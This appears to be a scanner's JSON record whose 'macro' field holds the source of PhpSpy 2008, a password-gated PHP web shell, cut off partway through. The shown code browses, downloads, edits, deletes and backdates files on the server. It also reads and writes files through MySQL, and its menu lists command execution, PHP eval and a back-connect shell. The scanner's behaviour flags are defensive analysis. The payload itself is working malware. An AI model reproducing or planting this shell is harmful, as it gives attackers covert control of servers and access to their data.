{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Command": "May run PowerShell commands",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Run": "May run an executable file or a system command",
            "Shell.Application": "May run an application",
            "ShellExecute": "May run an executable file or a system command",
            "WScript.shell": "May run an executable file or a system command",
            "binary": "May read or write a binary file",
            "copyfile": "May copy a file",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "execl": "May run an executable file or a system command on a Mac",
            "mkdir": "May create a directory",
            "popen": "May run an executable file or a system command on a Mac",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "<?php\n\n/*****************************************************************************\n\n===================== ????????,????????????====================\n\n????????????????????\n\n??????????:Sniper\\Super?ei\\kEvin1986\\saiy\\wofeiwo?\n\n???????????????????????!\n\n???1?7??????????????,?????????????!\n\n====================== ?????????????????? =======================\n\nCodz by angel(4ngel)\n\nMake in China\n\nWeb: http://www.4ngel.net\n\n*****************************************************************************/\n\nerror_reporting(7);\n@set_magic_quotes_runtime(0);\nob_start();\n$mtime = explode(' ', microtime());\n$starttime = $mtime[1] + $mtime[0];\ndefine('SA_ROOT', str_replace('\\\\', '/', dirname(__FILE__)).'/');\n//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );\ndefine('IS_WIN', DIRECTORY_SEPARATOR == '\\\\');\ndefine('IS_COM', class_exists('COM') ? 1 : 0 );\ndefine('IS_GPC', get_magic_quotes_gpc());\n$dis_func = get_cfg_var('disable_functions');\ndefine('IS_PHPINFO', (!eregi(\"phpinfo\",$dis_func)) ? 1 : 0 );\n@set_time_limit(0);\n\nforeach(array('_GET','_POST') as $_request) {\n\tforeach($$_request as $_key => $_value) {\n\t\tif ($_key{0} != '_') {\n\t\t\tif (IS_GPC) {\n\t\t\t\t$_value = s_array($_value);\n\t\t\t}\n\t\t\t$$_key = $_value;\n\t\t}\n\t}\n}\n\n/*===================== ???? =====================*/\n$admin = array();\n// ????????, true ?????, false ?????.???????\n$admin['check'] = true;\n// ????????,???????\n$admin['pass']  = 's0d';\n\n//??? cookie ?????????, ??????, ???????, ???????\n// cookie ??\n$admin['cookiepre'] = '';\n// cookie ???\n$admin['cookiedomain'] = '';\n// cookie ????\n$admin['cookiepath'] = '/';\n// cookie ???\n$admin['cookielife'] = 86400;\n/*===================== ???? =====================*/\n\nif ($charset == 'utf8') {\n\theader(\"content-Type: text/html; charset=utf-8\");\n} elseif ($charset == 'big5') {\n\theader(\"content-Type: text/html; charset=big5\");\n} elseif ($charset == 'gbk') {\n\theader(\"content-Type: text/html; charset=gbk\");\n} elseif ($charset == 'latin1') {\n\theader(\"content-Type: text/html; charset=iso-8859-2\");\n}\n\n$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];\n$timestamp = time();\n\n/*===================== ???? =====================*/\nif ($action == \"logout\") {\n\tscookie('phpspypass', '', -86400 * 365);\n\tp('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');\n\tp('<a style=\"font:12px Verdana\" href=\"'.$self.'\">Success</a>');\n\texit;\n}\nif($admin['check']) {\n\tif ($doing == 'login') {\n\t\tif ($admin['pass'] == $password) {\n\t\t\tscookie('phpspypass', $password);\n\t\t\tp('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');\n\t\t\tp('<a style=\"font:12px Verdana\" href=\"'.$self.'\">Success</a>');\n\t\t\texit;\n\t\t}\n\t}\n\tif ($_COOKIE['phpspypass']) {\n\t\tif ($_COOKIE['phpspypass'] != $admin['pass']) {\n\t\t\tloginpage();\n\t\t}\n\t} else {\n\t\tloginpage();\n\t}\n}\n/*===================== ???? =====================*/\n\n$errmsg = '';\n\n// ??PHPINFO\nif ($action == 'phpinfo') {\n\tif (IS_PHPINFO) {\n\t\tphpinfo();\n\t} else {\n\t\t$errmsg = 'phpinfo() function has non-permissible';\n\t}\n}\n\n// ????\nif ($doing == 'downfile' && $thefile) {\n\tif (!@file_exists($thefile)) {\n\t\t$errmsg = 'The file you want Downloadable was nonexistent';\n\t} else {\n\t\t$fileinfo = pathinfo($thefile);\n\t\theader('Content-type: application/x-'.$fileinfo['extension']);\n\t\theader('Content-Disposition: attachment; filename='.$fileinfo['basename']);\n\t\theader('Content-Length: '.filesize($thefile));\n\t\t@readfile($thefile);\n\t\texit;\n\t}\n}\n\n// ?????????\nif ($doing == 'backupmysql' && !$saveasfile) {\n\tdbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);\n\t$table = array_flip($table);\n\t$result = q(\"SHOW tables\");\n\tif (!$result) p('<h2>'.mysql_error().'</h2>');\n\t$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');\n\theader('Content-type: application/unknown');\n\theader('Content-Disposition: attachment; filename='.$filename);\n\t$mysqldata = '';\n\twhile ($currow = mysql_fetch_array($result)) {\n\t\tif (isset($table[$currow[0]])) {\n\t\t\t$mysqldata .= sqldumptable($currow[0]);\n\t\t}\n\t}\n\tmysql_close();\n\texit;\n}\n\n// ??MYSQL????\nif($doing=='mysqldown'){\n\tif (!$dbname) {\n\t\t$errmsg = 'Please input dbname';\n\t} else {\n\t\tdbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);\n\t\tif (!file_exists($mysqldlfile)) {\n\t\t\t$errmsg = 'The file you want Downloadable was nonexistent';\n\t\t} else {\n\t\t\t$result = q(\"select load_file('$mysqldlfile');\");\n\t\t\tif(!$result){\n\t\t\t\tq(\"DROP TABLE IF EXISTS tmp_angel;\");\n\t\t\t\tq(\"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);\");\n\t\t\t\t//?????????,???????????__angel_1111111111_eof__??????????\n\t\t\t\tq(\"LOAD DATA LOCAL INFILE '\".addslashes($mysqldlfile).\"' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';\");\n\t\t\t\t$result = q(\"select content from tmp_angel\");\n\t\t\t\tq(\"DROP TABLE tmp_angel\");\n\t\t\t}\n\t\t\t$row = @mysql_fetch_array($result);\n\t\t\tif (!$row) {\n\t\t\t\t$errmsg = 'Load file failed '.mysql_error();\n\t\t\t} else {\n\t\t\t\t$fileinfo = pathinfo($mysqldlfile);\n\t\t\t\theader('Content-type: application/x-'.$fileinfo['extension']);\n\t\t\t\theader('Content-Disposition: attachment; filename='.$fileinfo['basename']);\n\t\t\t\theader(\"Accept-Length: \".strlen($row[0]));\n\t\t\t\techo $row[0];\n\t\t\t\texit;\n\t\t\t}\n\t\t}\n\t}\n}\n\n?>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\">\n<title><?php echo str_replace('.','','P.h.p.S.p.y');?></title>\n<style type=\"text/css\">\nbody,td{font: 12px Arial,Tahoma;line-height: 16px;}\n.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}\n.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}\n.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}\na {color: #00f;text-decoration:underline;}\na:hover{color: #f00;text-decoration:none;}\n.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}\n.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}\n.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}\n.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}\n.head td span{font-weight:normal;}\nform{margin:0;padding:0;}\nh2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}\nul.info li{margin:0;color:#444;line-height:24px;height:24px;}\nu{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}\n</style>\n<script type=\"text/javascript\">\nfunction CheckAll(form) {\n\tfor(var i=0;i<form.elements.length;i++) {\n\t\tvar e = form.elements[i];\n\t\tif (e.name != 'chkall')\n\t\te.checked = form.chkall.checked;\n    }\n}\nfunction $(id) {\n\treturn document.getElementById(id);\n}\nfunction goaction(act){\n\t$('goaction').action.value=act;\n\t$('goaction').submit();\n}\n</script>\n</head>\n<body style=\"margin:0;table-layout:fixed; word-break:break-all\">\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\t<tr class=\"head\">\n\t\t<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y');?> Ver: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>\n\t</tr>\n\t<tr class=\"alt1\">\n\t\t<td><span style=\"float:right;\">Safe Mode:<?php echo getcfg('safe_mode');?></span>\n\t\t\t<a href=\"javascript:goaction('logout');\">Logout</a> | \n\t\t\t<a href=\"javascript:goaction('file');\">File Manager</a> | \n\t\t\t<a href=\"javascript:goaction('sqladmin');\">MySQL Manager</a> | \n\t\t\t<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | \n\t\t\t<a href=\"javascript:goaction('shell');\">Execute Command</a> | \n\t\t\t<a href=\"javascript:goaction('phpenv');\">PHP Variable</a> | \n\t\t\t<a href=\"javascript:goaction('eval');\">Eval PHP Code</a>\n\t\t\t<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>\n\t\t</td>\n\t</tr>\n</table>\n<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>\n<?php\n\nformhead(array('name'=>'goaction'));\nmakehide('action');\nformfoot();\n\n$errmsg && m($errmsg);\n\n// ??????\n!$dir && $dir = '.';\n$nowpath = getPath(SA_ROOT, $dir);\nif (substr($dir, -1) != '/') {\n\t$dir = $dir.'/';\n}\n$uedir = ue($dir);\n\nif (!$action || $action == 'file') {\n\n\t// ??????\n\t$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';\n\n\t// ????\n\tif ($doing == 'deldir' && $thefile) {\n\t\tif (!file_exists($thefile)) {\n\t\t\tm($thefile.' directory does not exist');\n\t\t} else {\n\t\t\tm('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));\n\t\t}\n\t}\n\n\t// ????\n\telseif ($newdirname) {\n\t\t$mkdirs = $nowpath.$newdirname;\n\t\tif (file_exists($mkdirs)) {\n\t\t\tm('Directory has already existed');\n\t\t} else {\n\t\t\tm('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));\n\t\t\t@chmod($mkdirs,0777);\n\t\t}\n\t}\n\n\t// ????\n\telseif ($doupfile) {\n\t\tm('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));\n\t}\n\n\t// ????\n\telseif ($editfilename && $filecontent) {\n\t\t$fp = @fopen($editfilename,'w');\n\t\tm('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));\n\t\t@fclose($fp);\n\t}\n\n\t// ??????\n\telseif ($pfile && $newperm) {\n\t\tif (!file_exists($pfile)) {\n\t\t\tm('The original file does not exist');\n\t\t} else {\n\t\t\t$newperm = base_convert($newperm,8,10);\n\t\t\tm('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));\n\t\t}\n\t}\n\n\t// ??\n\telseif ($oldname && $newfilename) {\n\t\t$nname = $nowpath.$newfilename;\n\t\tif (file_exists($nname) || !file_exists($oldname)) {\n\t\t\tm($nname.' has already existed or original file does not exist');\n\t\t} else {\n\t\t\tm(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));\n\t\t}\n\t}\n\n\t// ????\n\telseif ($sname && $tofile) {\n\t\tif (file_exists($tofile) || !file_exists($sname)) {\n\t\t\tm('The goal file has already existed or original file does not exist');\n\t\t} else {\n\t\t\tm(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));\n\t\t}\n\t}\n\n\t// ????\n\telseif ($curfile && $tarfile) {\n\t\tif (!@file_exists($curfile) || !@file_exists($tarfile)) {\n\t\t\tm('The goal file has already existed or original file does not exist');\n\t\t} else {\n\t\t\t$time = @filemtime($tarfile);\n\t\t\tm('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));\n\t\t}\n\t}\n\n\t// ?????\n\telseif ($curfile && $year && $month && $day && $hour && $minute && $second) {\n\t\tif (!@file_exists($curfile)) {\n\t\t\tm(basename($curfile).' does not exist');\n\t\t} else {\n\t\t\t$time = strtotime(\"$year-$month-$day $hour:$minute:$second\");\n\t\t\tm('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));\n\t\t}\n\t}\n\n\t// ????\n\telseif($doing == 'downrar') {\n\t\tif ($dl) {\n\t\t\t$dfiles='';\n\t\t\tforeach ($dl as $filepath => $value) {\n\t\t\t\t$dfiles.=$filepath.',';\n\t\t\t}\n\t\t\t$dfiles=substr($dfiles,0,strlen($dfiles)-1);\n\t\t\t$dl=explode(',',$dfiles);\n\t\t\t$zip=new PHPZip($dl);\n\t\t\t$code=$zip->out;\n\t\t\theader('Content-type: application/octet-stream');\n\t\t\theader('Accept-Ranges: bytes');\n\t\t\theader('Accept-Length: '.strlen($code));\n\t\t\theader('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');\n\t\t\techo $code;\n\t\t\texit;\n\t\t} else {\n\t\t\tm('Please select file(s)');\n\t\t}\n\t}\n\n\t// ??????\n\telseif($doing == 'delfiles') {\n\t\tif ($dl) {\n\t\t\t$dfiles='';\n\t\t\t$succ = $fail = 0;\n\t\t\tforeach ($dl as $filepath => $value) {\n\t\t\t\tif (@unlink($filepath)) {\n\t\t\t\t\t$succ++;\n\t\t\t\t} else {\n\t\t\t\t\t$fail++;\n\t\t\t\t}\n\t\t\t}\n\t\t\tm('Deleted file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);\n\t\t} else {\n\t\t\tm('Please select file(s)');\n\t\t}\n\t}\n\n\t//????\n\tformhead(array('name'=>'createdir'));\n\tmakehide('newdirname');\n\tmakehide('dir',$nowpath);\n\tformfoot();\n\tformhead(array('name'=>'fileperm'));\n\tmakehide('newperm');\n\tmakehide('pfile');\n\tmakehide('dir',$nowpath);\n\tformfoot();\n\tformhead(array('name'=>'copyfile'));\n\tmakehide('sname');\n\tmakehide('tofile');\n\tmakehide('dir',$nowpath);\n\tformfoot();\n\tformhead(array('name'=>'rename'));\n\tmakehide('oldname');\n\tmakehide('newfilename');\n\tmakehide('dir',$nowpath);\n\tformfoot();\n\tformhead(array('name'=>'fileopform'));\n\tmakehide('action');\n\tmakehide('opfile');\n\tmakehide('dir');\n\tformfoot();\n\n\t$free = @disk_free_space($nowpath);\n\t!$free && $free = 0;\n\t$all = @disk_total_space($nowpath);\n\t!$all && $all = 0;\n\t$used = $all-$free;\n\t$used_percent = @round(100/($all/$free),2);\n\tp('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');\n\n?>\n<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">\n  <form action=\"\" method=\"post\" id=\"godir\" name=\"godir\">\n  <tr>\n    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>\n\t<td width=\"100%\"><input name=\"view_writable\" value=\"0\" type=\"hidden\" /><input class=\"input\" name=\"dir\" value=\"<?php echo $nowpath;?>\" type=\"text\" style=\"width:100%;margin:0 8px;\"></td>\n    <td nowrap><input class=\"bt\" value=\"GO\" type=\"submit\"></td>\n  </tr>\n  </form>\n</table>\n<script type=\"text/javascript\">\nfunction createdir(){\n\tvar newdirname;\n\tnewdirname = prompt('Please input the directory name:', '');\n\tif (!newdirname) return;\n\t$('createdir').newdirname.value=newdirname;\n\t$('createdir').submit();\n}\nfunction fileperm(pfile){\n\tvar newperm;\n\tnewperm = prompt('Current file:'+pfile+'\\nPlease input new attribute:', '');\n\tif (!newperm) return;\n\t$('fileperm').newperm.value=newperm;\n\t$('fileperm').pfile.value=pfile;\n\t$('fileperm').submit();\n}\nfunction copyfile(sname){\n\tvar tofile;\n\ttofile = prompt('Original file:'+sname+'\\nPlease input object file (fullpath):', '');\n\tif (!tofile) return;\n\t$('copyfile').tofile.value=tofile;\n\t$('copyfile').sname.value=sname;\n\t$('copyfile').submit();\n}\nfunction rename(oldname){\n\tvar newfilename;\n\tnewfilename = prompt('Former file name:'+oldname+'\\nPlease input new filename:', '');\n\tif (!newfilename) return;\n\t$('rename').newfilename.value=newfilename;\n\t$('rename').oldname.value=oldname;\n\t$('rename').submit();\n}\nfunction dofile(doing,thefile,m){\n\tif (m && !confirm(m)) {\n\t\treturn;\n\t}\n\t$('filelist').doing.value=doing;\n\tif (thefile){\n\t\t$('filelist').thefile.value=thefile;\n\t}\n\t$('filelist').submit();\n}\nfunction createfile(nowpath){\n\tvar filename;\n\tfilename = prompt('Please input the file name:', '');\n\tif (!filename) return;\n\topfile('editfile',nowpath + filename,nowpath);\n}\nfunction opfile(action,opfile,dir){\n\t$('fileopform').action.value=action;\n\t$('fileopform').opfile.value=opfile;\n\t$('fileopform').dir.value=dir;\n\t$('fileopform').submit();\n}\nfunction godir(dir,view_writable){\n\tif (view_writable) {\n\t\t$('godir').view_writable.value=1;\n\t}\n\t$('godir').dir.value=dir;\n\t$('godir').submit();\n}\n</script>\n  <?php\n\ttbhead();\n\tp('<form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\"><tr class=\"alt1\"><td colspan=\"7\" style=\"padding:5px;\">');\n\tp('<div style=\"float:right;\"><input class=\"input\" name=\"uploadfile\" value=\"\" type=\"file\" /> <input class=\"bt\" name=\"doupfile\" value=\"Upload\" type=\"submit\" /><input name=\"uploaddir\" value=\"'.$dir.'\" type=\"hidden\" /><input name=\"dir\" value=\"'.$dir.'\" type=\"hidden\" /></div>');\n\tp('<a href=\"javascript:godir(\\''.$_SERVER[\"DOCUMENT_ROOT\"].'\\');\">WebRoot</a>');\n\tif ($view_writable) {\n\t\tp(' | <a href=\"javascript:godir(\\''.$nowpath.'\\');\">View All</a>');\n\t} else {\n\t\tp(' | <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'1\\');\">View Writable</a>');\n\t}\n\tp(' | <a href=\"javascript:createdir();\">Create Directory</a> | <a href=\"javascript:createfile(\\''.$nowpath.'\\');\">Create File</a>');\n\tif (IS_WIN && IS_COM) {\n\t\t$obj = new COM('scripting.filesystemobject');\n\t\tif ($obj && is_object($obj)) {\n\t\t\t$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');\n\t\t\tforeach($obj->Drives as $drive) {\n\t\t\t\tif ($drive->DriveType == 2) {\n\t\t\t\t\tp(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');\n\t\t\t\t} else {\n\t\t\t\t\tp(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tp('</td></tr></form>');\n\n\tp('<tr class=\"head\"><td>&nbsp;</td><td>Filename</td><td width=\"16%\">Last modified</td><td width=\"10%\">Size</td><td width=\"20%\">Chmod / Perms</td><td width=\"22%\">Action</td></tr>');\n\n\t//???????????\n\t$dirdata=array();\n\t$filedata=array();\n\n\tif ($view_writable) {\n\t\t$dirdata = GetList($nowpath);\n\t} else {\n\t\t// ????\n\t\t$dirs=@opendir($dir);\n\t\twhile ($file=@readdir($dirs)) {\n\t\t\t$filepath=$nowpath.$file;\n\t\t\tif(@is_dir($filepath)){\n\t\t\t\t$dirdb['filename']=$file;\n\t\t\t\t$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));\n\t\t\t\t$dirdb['dirchmod']=getChmod($filepath);\n\t\t\t\t$dirdb['dirperm']=getPerms($filepath);\n\t\t\t\t$dirdb['fileowner']=getUser($filepath);\n\t\t\t\t$dirdb['dirlink']=$nowpath;\n\t\t\t\t$dirdb['server_link']=$filepath;\n\t\t\t\t$dirdb['client_link']=ue($filepath);\n\t\t\t\t$dirdata[]=$dirdb;\n\t\t\t} else {\t\t\n\t\t\t\t$filedb['filename']=$file;\n\t\t\t\t$filedb['size']=sizecount(@filesize($filepath));\n\t\t\t\t$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));\n\t\t\t\t$filedb['filechmod']=getChmod($filepath);\n\t\t\t\t$filedb['fileperm']=getPerms($filepath);\n\t\t\t\t$filedb['fileowner']=getUser($filepath);\n\t\t\t\t$filedb['dirlink']=$nowpath;\n\t\t\t\t$filedb['server_link']=$filepath;\n\t\t\t\t$filedb['client_link']=ue($filepath);\n\t\t\t\t$filedata[]=$filedb;\n\t\t\t}\n\t\t}// while\n\t\tunset($dirdb);\n\t\tunset($filedb);\n\t\t@closedir($dirs);\n\t}\n\t@sort($dirdata);\n\t@sort($filedata);\n\t$dir_i = '0';\n\tforeach($dirdata as $key => $dirdb){\n\t\tif($dirdb['filename']!='..' && $dirdb['filename']!='.') {\n\t\t\t$thisbg = bg();\n\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n\t\t\tp('<td width=\"2%\" nowrap><font face=\"wingdings\" size=\"3\">0</font></td>');\n\t\t\tp('<td><a href=\"javascript:godir(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['filename'].'</a></td>');\n\t\t\tp('<td nowrap>'.$dirdb['mtime'].'</td>');\n\t\t\tp('<td nowrap>--</td>');\n\t\t\tp('<td nowrap>');\n\t\t\tp('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirchmod'].'</a> / ');\n\t\t\tp('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');\n\t\t\tp('<td nowrap><a href=\"javascript:dofile(\\'deldir\\',\\''.$dirdb['server_link'].'\\',\\'Are you sure will delete '.$dirdb['filename'].'? \\\\n\\\\nIf non-empty directory, will be delete all the files.\\')\">Del</a> | <a href=\"javascript:rename(\\''.$dirdb['server_link'].'\\');\">Rename</a></td>');\n\t\t\tp('</tr>');\n\t\t\t$dir_i++;\n\t\t} else {\n\t\t\tif($dirdb['filename']=='..') {\n\t\t\t\tp('<tr class='.bg().'>');\n\t\t\t\tp('<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td><td nowrap colspan=\"5\"><a href=\"javascript:godir(\\''.getUpPath($nowpath).'\\');\">Parent Directory</a></td>');\n\t\t\t\tp('</tr>');\n\t\t\t}\n\t\t}\n\t}\n\n\tp('<tr bgcolor=\"#dddddd\" stlye=\"border-top:1px solid #fff;border-bottom:1px solid #ddd;\"><td colspan=\"6\" height=\"5\"></td></tr>');\n\tp('<form id=\"filelist\" name=\"filelist\" action=\"'.$self.'\" method=\"post\">');\n\tmakehide('action','file');\n\tmakehide('thefile');\n\tmakehide('doing');\n\tmakehide('dir',$nowpath);\n\t$file_i = '0';\n\tforeach($filedata as $key => $filedb){\n\t\tif($filedb['filename']!='..' && $filedb['filename']!='.') {\n\t\t\t$fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);\n\t\t\t$thisbg = bg();\n\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n\t\t\tp('<td width=\"2%\" nowrap><input type=\"checkbox\" value=\"1\" name=\"dl['.$filedb['server_link'].']\"></td>');\n\t\t\tp('<td><a href=\"'.$fileurl.'\" target=\"_blank\">'.$filedb['filename'].'</a></td>');\n\t\t\tp('<td nowrap>'.$filedb['mtime'].'</td>');\n\t\t\tp('<td nowrap>'.$filedb['size'].'</td>');\n\t\t\tp('<td nowrap>');\n\t\t\tp('<a href=\"javascript:fileperm(\\''.$filedb['server_link'].'\\');\">'.$filedb['filechmod'].'</a> / ');\n\t\t\tp('<a href=\"javascript:fileperm(\\''.$filedb['server_link'].'\\');\">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');\n\t\t\tp('<td nowrap>');\n\t\t\tp('<a href=\"javascript:dofile(\\'downfile\\',\\''.$filedb['server_link'].'\\');\">Down</a> | ');\n\t\t\tp('<a href=\"javascript:copyfile(\\''.$filedb['server_link'].'\\');\">Copy</a> | ');\n\t\t\tp('<a href=\"javascript:opfile(\\'editfile\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Edit</a> | ');\n\t\t\tp('<a href=\"javascript:rename(\\''.$filedb['server_link'].'\\');\">Rename</a> | ');\n\t\t\tp('<a href=\"javascript:opfile(\\'newtime\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Time</a>');\n\t\t\tp('</td></tr>');\n\t\t\t$file_i++;\n\t\t}\n\t}\n\tp('<tr class=\"'.bg().'\"><td align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form)\" /></td><td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\">Delete selected</a></td><td colspan=\"4\" align=\"right\">'.$dir_i.' directories / '.$file_i.' files</td></tr>');\n\tp('</form></table>');\n}// end dir\n\nelseif ($action == 'sqlfile') {\n\tif($doing==\"mysqlupload\"){\n\t\t$file = $_FILES['uploadfile'];\n\t\t$filename = $file['tmp_name'];\n\t\tif (file_exists($savepath)) {\n\t\t\tm('The goal file has already existed');\n\t\t} else {\n\t\t\tif(!$filename) {\n\t\t\t\tm('Please choose a file');\n\t\t\t} else {\n\t\t\t\t$fp=@fopen($filename,'r');\n\t\t\t\t$contents=@fread($fp, filesize($filename));\n\t\t\t\t@fclose($fp);\n\t\t\t\t$contents = bin2hex($contents);\n\t\t\t\tif(!$upname) $upname = $file['name'];\n\t\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);\n\t\t\t\t$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");\n\t\t\t\tm($result ? 'Upload success' : 'Upload has failed: '.mysql_error());\n\t\t\t}\n\t\t}\n\t}\n?>\n<script type=\"text/javascript\">\nfunction mysqlfile(doing){\n\tif(!doing) return;\n\t$('doing').value=doing;\n\t$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;\n\t$('mysqlfile').dbport.value=$('dbinfo').dbport.value;\n\t$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;\n\t$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;\n\t$('mysqlfile').dbname.value=$('dbinfo').dbname.value;\n\t$('mysqlfile').charset.value=$('dbinfo').charset.value;\n\t$('mysqlfile').submit();\n}\n</script>\n<?php\n\t!$dbhost && $dbhost = 'localhost';\n\t!$dbuser && $dbuser = 'root';\n\t!$dbport && $dbport = '3306';\n\t$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');\n\tformhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));\n\tmakehide('action','sqlfile');\n\tp('<p>');\n\tp('DBHost:');\n\tmakeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));\n\tp(':');\n\tmakeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));\n\tp('DBUser:');\n\tmakeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));\n\tp('DBPass:');\n\tmakeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));\n\tp('DBName:');\n\tmakeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));\n\tp('DBCharset:');\n\tmakeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));\n\tp('</p>');\n\tformfoot();\n\tp('<form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\" name=\"mysqlfile\" id=\"mysqlfile\">');\n\tp('<h2>Upload file</h2>');\n\tp('<p><b>This operation the DB user must has FILE privilege</b></p>');\n\tp('<p>Save path(fullpath): <input class=\"input\" name=\"savepath\" size=\"45\" type=\"text\" /> Choose a file: <input class=\"input\" name=\"uploadfile\" type=\"file\" /> <a href=\"javascript:mysqlfile(\\'mysqlupload\\');\">Upload</a></p>');\n\tp('<h2>Download file</h2>');\n\tp('<p>File: <input class=\"input\" name=\"mysqldlfile\" size=\"115\" type=\"text\" /> <a 